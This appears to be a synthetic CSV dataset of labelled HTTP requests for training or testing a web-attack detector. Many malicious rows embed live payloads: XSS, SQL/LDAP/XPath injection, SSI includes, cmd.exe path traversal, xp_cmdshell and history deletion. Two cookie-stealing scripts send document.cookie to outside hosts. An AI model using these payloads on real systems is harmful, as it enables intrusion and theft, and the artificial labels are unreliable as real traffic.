Method,URI,Host-Header,Host,Label,Data
GET,/drk/larbs/_Dusrginclude/sj6GriYWI8K3/pHd9ekl7_15EjctfR9Z/i0iI3YOOOw2-8aYWh/erMqhy3swidileeh2an/eRU.vUHcH25/aGtgete1sgtAld2a/unssEnesjc/lst1ozasa/ynUin.mdb,HTTP/1.0,www.Tlrtn3.fr,1,sottugi3aykeoa=40919614&loghA=%3Cimg+++++src++%3D%22+++++javascript%3A++%5Balert+++%28%27R5ls%27%29%3B%5D%22++%3E&uw=dtmealttP&eerraTlIoea=feiBjogfka8aeWeie&yrsawaunRj=oiEzq&FHcgroup byJUQpasswdK=eetnnpa&n7le=%26i%7Eohaving&boqiadht5qyc=rFGwQOszfIL6&mno=xtermaoei
GET,/ndaoht/yLrt5zly0oq/mhFucmlAsns.htm,HTTP/1.0,www.sqr4shd.uk:80,0,8NFULIBVjFIi=nHlep2srhIeu&6te2eThumsonnee=0797616&aeiq9K=yK9E&SdeutsY8=whTwsmwt&l3oi=2595305&tecYqylaa=o4qastpOu%28i%5B+processing-instruction%2FRtm&HhIG=ea%3Dvniiiofe1%7E&lthel=cc1ecsctm4d5Dt8&0sxrttry=ehaechooztlsl&JUvDmadminmopeny0dFp=5279&46ieesWct=4%27epte
GET,/ozdh1yecwnxwnorjorn/u6eane8ti/tg7.jpeg,HTTP/1.1,www.ncn7.be:80,0,iwp-WKdocument=aowinzutowN3nuA0e&nlatf=3&mNt=9626842
GET,/isdl1fqIoDnOsomosgs/fH1B/c.6FiPmLHpj9xP.pl,HTTP/1.0,www.ilrsm4.ch:80,1,xh3=492985&eymnmeiz=aao&Mo=7&7baeFl=t6v&mmatnnwoshhd=rge5sdorrTsr&etH=hs&ssosea9=ebn5&zH4T=geS4e+%22+++++++++style%3Dleft%3Aexpression%28alert+%28%22+++eeic.Hd%22%29%29++alt+++%3D+%22&eyIs=tYA&xeyighdcw=31575062&liiej6s=oUfrS&de=8906247924&ce2sLdcAn926b=nssteKboIeijh&33aomncaOmee=eezUgdaeys%2Beua
GET,/Xanmmaa2.html,HTTP/1.0,www.sg0wT90u.ch,1,afa=dtl%29%28%26%28objectClass+++%3Didd*%29
GET,/bc/emCURE0ME8k/dytNo0mBlbllx7d5/s4xuG2zRvxNP/pWOp3kaccess_logLVX/sbE3Ndk94tG2nY/kEa8/iuttltdliora7ed/iy1nlX4nniltaso/nIThfdoc3a/c@RWBlE2_XVOfH2Ol2W8/AQLnph-WGSH7.htm,HTTP/1.1,www.oeIOmish.st,1,Ari5cttahe=6185&blsees5lNraaio=t&Te1srep7ejh=enPSCo-rIW5&sacoe2enF=%2B1adircaa%7Ces6systemrn%5Csbt&nntttokhTas=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F5469%2F**%2FFROM%2F**%2FseSinedsk%2F**%2FWHERE%2F**%2F%28++++%27%27++%3D+++%27+%2F**%2F&ylegammei=071&iitllshttue=phi&n0b=OFtniot
GET,/u.BF/ms/rWm.Hjx/aegrseqrnisogOdetu/rWenhuA9aidteeaiwo.jpg,HTTP/1.1,www.wdrkao.uk,1,28IYDHSJwhere=teemmiEeoegcadteu&REAB=ea+hadmin&1bzstdin=nd%5C&if=latEtneseya8rdaPMi&ndlraa=60&lccgdjrtlS9h=5&pilw=siepd76ydwwieeo&Tk7c9=jtpssajeeye-O&FessEB=w&YZzS=503045&yonagbtud04ti=%3Cimg++++src%3D++%22++mocha%3A%5Balert++++%28%27at%27%29%3B%5D++%22%3E&srrhnTttsewdmn=vbscriptrnph-smet
GET,/positionservices-obdLbdoPjp/wHPT/2QtlP27k.pmFze3WC/5hLsQZMQjk032u6ypG/dJ2URTdt2GqePM50.DNG/hiShBb3mykzJkz/khavingcl1VlXS4B/8her/ai2reusrc7eorul99n/br@JFosYdWxc.c1X/tEz7eR2WspgrxThQbY.jsp,HTTP/1.1,204.106.119.2,1,qe3b=4cZoyZzPfwNx&kS=hsi+u&hf4lzNgtnHamgTa=i-emfofeesttos%28&uauwsnestNExs=4717345&fej=5+positionore5v%3E%29+a&Esab=0&fchesdtofs=%29%28++++%7C+%28+++cn%3D*o++++%27brien*++++%29%28mail%3D*o++%27brien*+%29&DdclydMg=hrw7nIseeIt&negrrrhusF=zmocha&tgfa=i5rb&e7eerhtsdo3tlo=m
GET,/oeeegux/tQG3cgwV0Y/8node-/eO/hhu@PbSV/antzemha/5N/mrFzxqN/aZQN/mhIv5eeof0aiUunai.mdb,HTTP/1.1,www.Enalsasaep.com,1,crli=8LZbg_2MVH&itzdadAp=o3Qc-kxcGB&dtfrlo=%3Cbgsound+++++src++++%3D+%22++++javascript%3A+++%5Balert++++%28%27zowlmN%27%29%3B%5D+%22%3E&efy=esetccdnullevbscript+eog%25e%7Co%26r%3Ee&nOAlMB_SD=uare
GET,/u0ofcIk9/g5bpHPz0BI-WBh/9cEOrpnk6m2d5aR/b6okUfd.S.jsp,HTTP/1.0,www.hluaahhie.st:80,0,ciyr1=oedoinetcatwtarukt&naEBcs=os&iUarajrrransjn=tEp-BBj&mhai3o=2
GET,/aJ6_oJ5gZO@gOGOpu.nsf,HTTP/1.0,29.36.241.1,0,b3Hh-@jMadminPDw=rlsstwl8ouqqoatiai&UIzhnoinal7ttbE=8&hbixmuch=3051
GET,/ealtjsefetste2b/Ipt/adWhPqidpy-7J/eetehtfex/9mjdI4uLxT/n4aatysweh7Lerqistu/e1/tAykxCQz9nX/eu/nk942Er0b6wmss/yltesol13v.shtml,HTTP/1.1,41.214.239.12,0,oae34eratc0E=2ydi&9echoLetcxGdf=nth9&_m-oRq82b=mQtcoFbZvgoK&7cUip=9381591
GET,/nh@U2catL6h/susiCTcrdtNRpttrhhz/eCd.OaBt-rXptnCGr/oLeoeKGe/aDkBxwuWY94/XJcatiNOO/h.YT.js,HTTP/1.0,www.slefeete.ch,1,i4rsteDasonc=ds&qfowrE0vE=igv&i2jeefmurI=%2F..%2F..%2F..%2F..%2FInetpub%2Fiissamples%2Flaelmerich%2Fastons%2Felol%2Fng.nsf&2ra=tAfDTnandh+T&fisusblhyznax6b=eig%3DrImoW&lhTpEOpedl=sMW
PUT,/tcuvroeDdQgtZWpJOOUJ/konmw/eebntnsiffrrk8ho/Oy/cYwZJM3pLbody/tdIHEm.php,HTTP/1.0,215.229.162.107,0,estftxt=fJg&Hwceeuesse=53544&opaoa0npu=oGh4U61&ihIlidyegr5pO=ugx&B.Uas=66813982&nCLVUhome8p-=neunionyaEi4&nsn=uZQ@zIHGLTru&8qnr4B0=rr'an9elle&7X3or.LNGobz=xb&oih-=9hitcRUeuld1h&1Oal9eqOApdTesG=1&Htrnro0otry1x=itrennmeneoy&MzJETzo= veI|dre0mcmdnhttpt<&geet8nFlyotm=aa pfcopyitescripteteob&replaceinsert.wgetgHPMdivi-=keuo6sstnm
GET,/LqMc20rV6/ex8s25/vB/4_qHqqNXBKSjc/Cjxc/tbqfpXO/0YHD_8/mUO/mfcaonC395/ui.php4,HTTP/1.1,178.59.78.172,0,wemUrraorpe=eil&5t=2&TrisAaa=828103&abAtelnetP4BpvpZ=-Sue
GET,/zMaGdM1ZFKqq0d/Z89t8Dvfvw/passwdhU7zHGms/WV_sbF.m-saccess_log/euirogaEl2oeooinvoa/u0sgiuQi1iacwtia2odr/s9S-nKRPg@A/sw7lis/eoaoulr.swf,HTTP/1.1,www.oemFmflM.it,0,8vei=i9aatFtneutom&YzmN2c63=794638&arppzb2e6lrV=tq&ltt3tb=x4_Kgp&09Yqh=idl
POST,/R_IkFx/t1B4ueQuuQDe/eYtV/mEiaoHbTUFbna/crtfttTela/eaW/nFi8Bv.O/re6nore/uowalm7/eirbhngtdwGms/matseafs.jpeg,HTTP/1.1,250.162.244.164:80,1,Ogo92d4optMP1b=<!-- #include virtual='d:\\windows\\autoexec.bat'   -->
GET,/ZxtermDLFRfpkmetaV/o3sowOyN9doHkreoEOwt/yYX2dbmw_U_U7Kkt0J/6R9y./rxOEHXyuqpT/5P3_j1J-B/0FRZIgf2QQyiB9@Hi/iL0Vw2r/tefneadltS/tSaP49J0/our2krquuQcSlDfSONt.css,HTTP/1.0,www.i3aopcLat.de:8651,0,esher=ejYo8M2fKwee&2c6amfr=677&luMnunkeis7tzfr=013&mbnOaqy1gsybae=RPewherecatfeval8I+crmochai&afqe=7835&oimsheem=hpositioneehey%25e&tfseoihtcR=655&t8aaehiM4k=eMmsnm&eEn8=Lscripteet%26dls&0ecRbs=wSF8D&ksdfn2ee3iB=47
GET,/OOcopy/ted1nteE/rZ1MKt8b3nG/Isooqt8e0tii0r/anaqceDt.aspx,HTTP/1.0,18.62.215.51,0,QpHz=92&uajo61heedE=hanes&Afe=35&nnazemhsitO=bs2Okuj
GET,/sR5TAbCA3f0/gx_QNZi_QsR95s0L@lh/t0hmqashtsehirIee8/cHo/c1TO7j1ZfcORjEc.mspx,HTTP/1.1,166.131.109.142,0,1rpats=5931&cTntde1tO2tk=s&uthy=6Qn-qsL-cuZX&IeeksrGwsU8I=e5tasstp7ohdoees&s0txyeTmatpi=oa4Pxer0rl3ganl&tslnaTp4tz=anEyhJpFR8Jj&enaTE15oayop8r=9l%7E&431V5autoexec.d2m=530493521&oa=638&IbJB=309285548&4fT3=ud%28n+ain&ei=emBDApWQ&o0ul3Tmthe6esnr=shnunEbJ&logb5K46F=na
PUT,/eavK2.JCy9Uu6/tlRgMu5.VaaqJ/or/axp_GEE8Mq/aRqsnhs/RvIimg80/neik/S096cu/tZMqF.nJe.asp,HTTP/1.1,www.eddanbwet.de,1,pIhn=iregisaNtuub6stp5a&RX0C=teconiKndubebeaonm&au4uye=74500556&5sOelRa=h>&ladsEreaeRew=atyawhoanoS2h&cn1bRq=280483842&zaeeig=10914737&s0O0=bHxrnpfu4lk|a&fiyemsemd6odt=hAy&frsqmn=gi9s&se9pit1yriTgsja=tgt
GET,/nsdIIP9/pe.jsp,HTTP/1.0,www.iOn9tamu.de,0,likeDf2UpositionPf=graaeeblsaoteqrh&jnxleyayalcOrx=8&catJ5871Nk=7209566100&tndar9nnehn=u8yIahxuRlanee&ogeeow=xht1eohlT&vKCnph-=8732&Te3=%3At7&htTeeempnel3lee=ramaihSstTac9e%3E&nonnor6th=y%25uPln&lJsystemaTv=wofy1
PUT,/ll.nsf,HTTP/1.0,28.128.234.178,0,osrtlv=ba&oa1=ne&teing=noad&NfunHuofe=gb5bhdxi1aenf&5kPZD84=tkSKAEQppZrL&ia0iieaooona=ologCa&orosgkanyuy=h4aIxE@.D3z&og4=ytscre~rcopenmeyhah&tnhenvr=w_OW-I&nicrcSeee=ezbgs&IrkX=2t0bg&9l6t2toemikbn=En&uafnqan=dij
GET,/lwAaQW/uO6XA-E9f.shtml,HTTP/1.1,www.w4ea.uk,1,so=wtA&0dllennreo=Oxjmu&tPd=775&SwrNm0E=rsh&k7Ta4mxzoc=eign33vall8pn&toy=ns&tVtYWOAsCLZk=chaOwse2ottowk%401bshutdownls&uaeout8orbo=41&F9Wr_=ia7atsi6qwuaolo&orhoFqdw=%2Fsock_stream%26+&czmW8N=02&2laatueRtnsjv=+oeae&mRPSD=%29+++%28+++%7C+%28zzi%3Dnm*%29&a1o83NQhr=xEiphphtpassgIngi&wadomRa=aIHQU8Fg
GET,/tUPoq/h@og8iYGsgE/vyJd436boot.inig@WT/oworepWe4/rjstyleT0y9evOWd/cfh6tazallmn8sdn.aspx,HTTP/1.1,61.213.230.239:489,1,4ship=lscriptw&nt=ipUJ1d%40CCiLn&feoEheyta=iieg&aavtPehsfunnvbo=ta%2Bliredcoqe%25&G9VJ=9999654&X.YpsKoE4Ks=p%7Cwrb&Lkctnioasass=%29+++%28+%7C++++%28displayName%3Dhad*%29++++%28name++%3D++had*+++%29%28++++mail%3Dhad*++%29&NtttatrE=dnubinF%7Cake&ilmns2y2ca1y=isCasnaem5&DimS3RCMYDCE=63392&AFh0@Vl3hkM5=79784556&7ih=e_%40vIu.xljj
GET,/scripts/..%2f../winnt/system32/cmd.exe,HTTP/1.1,62.28.221.119,1,/c+dir
GET,/uaacme/-DD2m/ptx.dll,HTTP/1.0,www.g5irceu.be,0,imev=+CUiyt%3Eiei%3Cac&ieos46rna3=asseehH&udwhi=e42axseese&htlb4itxiieE=tgs+ArD%2F&gPpl9=oejbs&tbatcn=7
GET,/nAEkDcsLCICiTugrAN/sTnxaymsiad4tt/8y.bin,HTTP/1.0,www.ee70ot.net,0,x3KLZ=96136
GET,/aJTrk3dtbGSrRXctls3/b33wS_/ool77R/hBrp0IoNfmsYSjeyS/mk63fRKRgl0HdwiQdJX/rCEEH6nxb91uJHIkR@.mspx,HTTP/1.0,www.eoirwCr.com,1,aooaetnmnecg=1089&Jm3VbCdWETS=ywehtacces%29eat5&ju7ehAFuXE=n&body2.hbodyW=155554&wdrs2Aem=1e0+gtcefEaoptayt&aR9styrdeaRlIg=nc%24d&tkotn=75645680&optOrmp=5-rn+iincludee+%3Eecho+princludesto&teaa2=odSnysuauo&DXwMtyffpyJB=zeSmlu%3Ddccpassthruz&a9cea=tdgD&eued=095&mMPSYEtqc=8&9jMZyeF=%27+++%3B++rm+++++%7E%2F.bash_history+%3B&whns=v+mail
POST,/nDjKcwC1H6tgdMQ02a_W/rawonw/0eoyo9fA4noIo6ueecp/uDrssesattyvAstjosyt/fHoXfNE8X661a_Z6a2eC/2SLA8kWhtFaM2khZGGcv.pl,HTTP/1.0,www.nrEtr.cz:1,0,Sdan=hatsh0srdhnueauot&zeieOe=9&enhsTo9asel=GworgnkfotntetEr&tykou0=ld1rcuvr&mmedsBiNye=Ecsnbnnubcrs&xo=i6W&S9=hh9RMou&2z.LmXGLecho=kaneftpsinDsscriptolh&9n=boMtgnda&iotOnpieit=t7erEbx5 xxmldododa=ebody&gieTttaaedoi=ha4y&dxml4K0iXH=ecattsmetar:asac[jh
GET,/oiTczfoailtrnetgH/Mtn1wlicagd4dni/mN8nzCntbawaigid1/dOqOt4dcg4i8Ibzyh/h9/HExaK-/sk2oaoerUncnonaHnntu/aEQvu.jpg,HTTP/1.1,www.efieei.ch,1,4hu63a5pnivaT4=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&rettf=g+20as2twe1e2+&jalsiepcegybbfh=ynmeta%2Fpla&idu=jyU7EYOgobX&os08f5ad3eoonog=4v&irgsee=eue0&irhrihsdndqkd=5
PUT,/MhavingIAy.S0oechoj1/aoD.zPN5Jpassthrunode8/4ERXgTU4Z/zW/SsobneeakaeiuHteaEtc.shtml,HTTP/1.0,www.wts4aesbt7.it,0,aenol9nliLe=94025065&nzic4msc=ntero&feEoShb=$5bgsound&et=mn te&Xindiezcytak=dnuaanyppowNcan&mXywDeQli=e7idfe7u8&wJ2XWjV=7syOemnu3&9t4i0a53nkoya7=oazgTJ&PpppsR=t&jneihec3eohTdae=hwOia6breplace&1Ent=ixugrtnhramahi&tra8Rde0=EMpkx
GET,/Tet7AsS4ehaaUuebtLo/eeae/uoreeavohrtbZdnja2/l7fne9pWpElO00G3Fl.png,HTTP/1.0,78.32.145.72,1,fHTAeUFmHn=exec+havingEs&Y5QvOCiByY=2ts+++onload%3Djavascript%3Aalert++++%28vqiRtn.nEl%29
GET,/tbF5X05FFiC3z/n8Uyxsaibeoms4r.aspx,HTTP/1.1,www.ftnsl5lnii.biz,1,euatuaAF8hlae=1657+++++or+id%3E3+++++or++ls_id%3C302
GET,/hK/vbscriptT/mute7matimmenb7c/xhmIe/vlogUGnc/notapeeoAr/dpb_FY@nriLFriflT2x/sO_/uZF2CmNOqz/estoah/aeXpny/8EdPE.aspx,HTTP/1.1,www.dolFsii2op.gov:80,0,iitixwAheeu=02645854&iPtar=jmeta&hSgbrdtezcbr=qesoilteht&54pmhtlafe=la4valn&eraIo0atti=+
GET,/is0opgqgoH/s9rjlauhkleoaen4/g7@evdaY3o@dqwbu/yDlOj1E@Rl/CxeNtmlyrxio6ur/d8srw__Aa4U/rhnt3.tiff,HTTP/1.0,217.132.88.13,0,F3Li=hp&7q4nmhoeery=nnnatenhomefo%3Aewm%26divo%7C&nsify=ah%3D
GET,/rN0GlIaLY-JtzvcnR9e.shtml,HTTP/1.0,96.134.29.158,0,aereeeKUlhhlni=ntveior4oc&rEgroup by2Le=210&to0a=07921&dtinutt=N%28&ee5nbfee=+9A&ieteo4sos=7918588
GET,/twtfgeAyflnae7thed/eakC.X33/m2tr/NLftp7r_enBXCJif/cz/onPrm8thiteunTsv/tLmbt9Y1QsobdZOJj5Y/iohHmI/ojFPEAtp/yYUUtH0cutup1.css,HTTP/1.1,www.h1thioerf.biz:80,1,eoie4sth=cmathpaaZtaanha0&m8mamaaewtrlo=aNHS-kGui9Pe&qioh=899130&teranoroE=1622260&ruTr=ieG&s8e6etfrhnts=2&ar9nAgvseftuitT=ls+-las+++++%2Fhome%2F++%7C&dXn=47&olww=tidcrsnhposition37&sietom8dNthtma=+%24%25&lyetW=rar8s&Fompfi6tte=nerotiAIdPeo&el25f=hpcH67%40haZ&hrsd=e9r
GET,/Vf9HjiframeA/adminvFb8SaF_j/9aw8rabeh8as/3eWED/amJS/RyQrshutdownprocessing-instructiony_iG-xe/euicteFLurticw6lr.php,HTTP/1.1,www.7ahO.st,0,padcybauz6tr5s=d-a%28r&efuia=28161&Tdazoh1=roecs&Eaybuoi=0reweea6rr1gtqoe&sJC2p=%25gsit&woSs=niZJn6BYVd&degbohcsn=istczlexchildra+tmpi&Lbei6o3foTeq1a=nqd9se5nlw3+passwdksiedrop%5Ce&h7OjSea8rk=Eesvhc++a3lpe9&I94b=nnsvfaogtE&lesab8i=er&lorhhyesidcit43=w3v0-&hpf=8135978923
GET,/aoEnen/rt/57gEQXM7h_qjE0pc7/nsretgits/u1arlheitc/akdPPzeItchFUbp3KV/dya3YuapagleJXxltf/cj4OYVeM@6igRdS1/6FfnLDfDjdelete/h4Zx0km/srhgwta1nsMmueeb.cgi,HTTP/1.0,68.18.242.88,0,YUHPY8_xYR=iestsnHpHq%3Cs&oreeAownat=winntd&olj=tmp&yrts9i=usMIchhnsi&v9l0Ler=io&imgFHlMKXP6object=164454&X.oscriptN=cCzAUx5&lNtlotbIt=0&Q0uDA=efzsIs%2F0ihwep&me2oohEsnd=urh&dmnsmsae3pgn=y3tMHV&sonreArehPt=svghcwuAs&aphMrhSnnsusoi=kea&ueDnn=mFnoo&ouetnrnoeteatqG=Pibgeodficnkskp
GET,/eqkF@Q/vmmdBrerkSnsbEe/cD1MPDAUNBboCO/d4gS/7cAloqNneittjeseD/siHuharht93wtrrne/mlee/b@hzW3StyYpu0VtLZI/lrtbhishGosjmdSxarhe/.Zmblike3Htl_Qd/aergl/ssaGhdiie.png,HTTP/1.1,95.48.241.231,0,gfe8pffheazs=ohbV&@elpasswdaC-7xmlQ=ce%25u&eow4ig0xr=scriptechohosecnAxml1&n8h=%28%5Doio-c+0ailti8xi&5U1QIbody=n%282+&K.bDRL5=e%5Cc+h&vo=026&yZ0TT@4TGdS=94943219&yeob6r3edezzax=t.Op6awU&enadnyleejaa=n6yubnya3cmo0b&onv=ne&aabmctra=Fdocument&vgtGrni=mrU&all-SI3=0
GET,/oruqrt6henisteMvistj/altxn6ra/wuV9SJ.KadminAanxi/eco9tluimaesbinie3sy/uQD/dtagzseolL7n/pR4hsaes6ZrEid/eIxmVy3fEnqbmTG/Xlda/evOHqDR5c2kcKn.mspx,HTTP/1.1,140.219.164.47,0,0OCImocha_AY=+&nirPieeovh4=caeaomhtoc2gees&earS8=hzSfqAou&eDEiewinp=ds5%7C60dmia0s&poo=E&km66A=hhTaethiseaenyoctt&ipn=8739486
GET,/kHJd5gd2G._LVtelnetu/wi5rdn8layodtt/eocrnaECyhrtyoa5zvs/hgzcu7Mof8rudrre8eqe/leGeatpeptcs/ecTho5rOrotS1aiitQw/scriptlocationwFGheplq2/FMS9gDM.cy.jpg,HTTP/1.1,www.ntunmekpe.gov,1,tdddmaprn=tenhenena&M1jz4f@bh=tv2JfNkH&htpwu=nxW&dhttpyF-H2XJ@bin7=9427&isu8ecllhneayee=%3C%21--+%23odbc+connect%3D%229e%2Ced%2Cno5sm%22++++++++statement%3D%22select+++++*+++from++++rca%22--%3E&ioeniE=o+4%2B%2Be&atwAsbiy=iaerncntdtnml&odte=lehty&teaenqa=sgFqUIwaetMR&4pcavq=6382579
GET,/naGafstotnl24mtdg/v.fa/okV/e_Cn-/Likceaet1c/prduM/xconwtezaDmkgk/au8thWePHs9ntntzwe3.tiff,HTTP/1.0,229.186.218.118,1,Ams7AW=saatUiIoIro9xlrec&n8UWtT=%3Biiol&aoytLtmY6ssA=%3Cxml+id++++%3D+%22+++X+%22%3E%3Ca%3E%3Cb+%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F115.205.235.145%2Filtoas.bin%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa+++%3E%3C%2Fxml%3E
GET,/lTHl1uXZS@P/hf4/8nnadefhabsezhgTt/byOlU9NW/eciilxdrpehigne/AAW.-c4btz.cfm,HTTP/1.1,www.cxrntabne.biz,1,snileeft=185613082&X59mailsnF=nle&ge9atnghtcteopy=n+yosock_streamktelrdM&tf=89Ldrayvfn0emhn&GV3_MAF=%7Cns&ilw=9tnajeaadminnesh&Tchskfao=%29+%28+%7C++++%28cn%3D*o%27brien*++%29%28mail%3D*o++++%27brien*++++%29&wtm=ymv1mnsaxj&mtG=%26ngtNn&soet6eka0lwStna=ezlc&mEhzYea2=cJoi2passwdmn8ts
POST,/oOonesidd1ndbsitpsoe/vte/CaedJSaueetseinere/fR5MxB_Fn4HXy/ean9etE7n2aS/YJ/06Kpiha6S/PmetaqW7Nm-hUM_zwk.css,HTTP/1.1,www.uelsePcers.uk,0,eixp9t0tenutnL='oeLdiv&.UT5kidimgP=evoecspo8%Oumme5i&iw2oIhe=m7n &fntrmeo=aeq&ASSbW2=ttm me
GET,/2uhu3ecst/zttdssNoddn54o8oolSt/eieceeyng/rogoPCtC2sg@SgTTg41/AnqpA/vn9tiiIqsnterbetys/osrh0bwm7hwhSian/moOtSFnwAZoM2l/ye8VtfSv3vo_.asmx,HTTP/1.0,www.mhhar.ch,1,jtrh=50735&olov0gh3Emnisrn=43019496&c3Ed=5164751&rzNeC=S%2B%3Dr&FaGmetalcfN=4&Dncrabe=29&tsrhwed=25430917&atVthrnmrloian=doc%28+file%3A%2F%2F%2Fc%3A%2Farm%2Fhemw6s.xml+++%29&o8fSOeN=TroalikedthoioN&I7aqsyhtihr1sxp=%280uLi%2Btrttboot.ini+netcatsi3d&dan9ibzpiurk2ln=9522577&l2ii9scce3od=7064
POST,/ikM4UA/yAnqsufbtrs9/bgdt/libeTvG@window.open/xEo.jsp,HTTP/1.0,5.249.240.72,0,3eeoib=hniuqp2eycme&s4kkctb=69&boeafi7=ieatj&u85ssier8=ieindRa&pRetzxe2judc=56836&nh=2634819&tkfe=us&hr=92731&oetonstnv=400717
PUT,/cqFQ/iKY6e0inhMDVY/httpqwJBwCTyB/t9s/vr6eW@/Iszq/ekohl/e5tum8hrkeettovv1s/8exMA0bMOp1bgsoundW-L/bI4/eQXSEO8eS.exe,HTTP/1.0,144.133.195.64:80,1,535oEank=ixtTsC'   or  Sp1/a1/child::node()[processing-instruction()=6]    or  'eNI'  = '&yejiuy4qzlbn2e=p &rice7cvesesccf6=38&nraphedfeo4eB=lfDW&mkntmewahmfio=56210&at1aauaqyao=iAIe4bcyq1moE4&edDdttsro=c3bry6&pnMNVJbhttps=770724&iqEupdatebgsoundel=loonteed&ce9aTjnopeuaa=0ZLmd-t
GET,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.1,94.145.36.220,1,/c+dir
GET,/9WM/ewyteTm8Esn5iEtas/ftaAsbqpxithesbf8g/hE3ICiP/rQO3Ns_3_As.4NNK7npH/n2e.jpg,HTTP/1.1,180.51.111.82,1,Dn=eeuHotzkhwynd+macceptk&frnuulec=osvvifitdEmlhkt5&nehsAehiasEfpt=556634&igJvTyTdi-=ewrogkerepr&iecbJ8a=49.155.48.212+%7C++++dir
GET,/tASYT1yG2rs./oseO1aniu727e9/wp-ThuF7bEOW@/pItexPa5@PBR/eltmsnSci/alaznlistnonfehfnosv/snrmasnreee4/eh94vsuoeeieEI1is4l/e@NVdGC58JZY_8Vk1/taWMYkNTqv/O1fL9k1rCR@c.png,HTTP/1.1,www.g2Sq00.cz:53120,1,SpVssesmaz=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
GET,/lVEU7QmOHMP/aCCY35oFqnV/oQk6IV-Kqa/ernee/olGySMuJformjOuid.php4,HTTP/1.0,57.48.223.77:80,1,usth6en4=nxR2dsthtri&lpeshO3fhe=ttyoe9dm%3A%40N
GET,/_vf8jYrj@QLlphtpass.bin,HTTP/1.1,www.itate.fr:80,1,dgeu=%3FeruaNdwecsdNr&sIee=buD5cbh0dfg7wgD%3Fc&WILeqBgbt45=661&z2aoAii=8174746561&UUnetcatEe=cr+1a&Je1ubscAxnsc=yueItau6gC9oe&H9a7SnnnisElsla=etta7&aad=.%2F..%2F.%2F..%2F&1cy3shxeorntnf=ttu7e%3Faiets+&inwir=ie&5Smu=or+a&9elsplsTgoesb7=2726885&t8mxNnysmy=2yRt54mv_6N
PUT,/aR-7kheZckaK.sh,HTTP/1.1,106.128.179.218,1,fE7urulTloinVe=rs31s&Eprocessing-instructionYpF=538291&hg0nsh=ili' or   count(  path/child::node()[position(   )=((    i  +j    +  k+l  +    1)]     |  path/child::*()[position()=(k+1)])=1  or    'ou'=   '   rno'    or&nEhtenentoau=ht&ttygNiSishsteeb=eaoaky
GET,/rh.htm,HTTP/1.1,www.nterh.fr:80,1,eeOa=frlnmarshormec&aittnh5wdbh3dta=4s+%25&ft=dreiihuMo5&CXb6wfG2sS=52nzwtE&rsi7otEeh=xacdocument8heiunionssts&wsSg3autneal=326&h6rr=%28nOtnm&lntrA=74960890&nHqtessw=waasgieapnnpzZlr&laEoao2m=pfgejs&Rcts2Ftrru=2888875&zLttefvslhz=4540376330&nrski5dpi8=O5elUxir5o6uh
GET,/vjmsfM1rewoTpoe/eL@ArYPqvNWzUkW9nf.cfm,HTTP/1.1,www.h21d.it:22862,0,k1naanSna=connecttlo&_2ymB3bbin=09631
GET,/afgLCkcW7pAMT_HOWjB/-oJJ8krYfhomer5NF/tv/gsLgfn0es/ZD3m/ZJ/KCbptmp-tMb3/uKasNv4wS/reISz0v/tGFKXQS/8XaQS5biH3lTODGv5l.htm,HTTP/1.1,www.alcd.org:80,1,a8xrsieeIetfo=dGgfZGWn8.9&ec5dliiiOritei=472&dleuesehj=560&lcfa=%3Cxml+++++id++%3D%22+++X+%22+%3E%3Ca+++%3E%3Cb%3E%26lt%3Bscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.ieient.com%2Fcgi-bin%2Fllesli.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb+%3E%3C%2Fa+%3E%3C%2Fxml+%3E
GET,/mF2tneIoE/A8CixRWK6T/eAvIeqfTn.JEBM_OFq/oQ1t/pcnado7ra2v3xupoyobh/axtStgirboc5/83kvbodqynqfromCp/Gedt.msf,HTTP/1.0,www.srfdndtuq.st:80,1,gn92nhmn=i0&IvN8Rmrl=olimmE8toem1tritwL&ste3inse=exec++xp_cmdshell+%27%22g5ddc8bdr%22+%3E%3E++++script.vbs%27&nainhtj1cnDnei4=kinpa&H223hahl7hewo=r62https%2Feb8eem4e+I%3D4s&82B0T2QMecX=tHt&cae=Mq8%2B
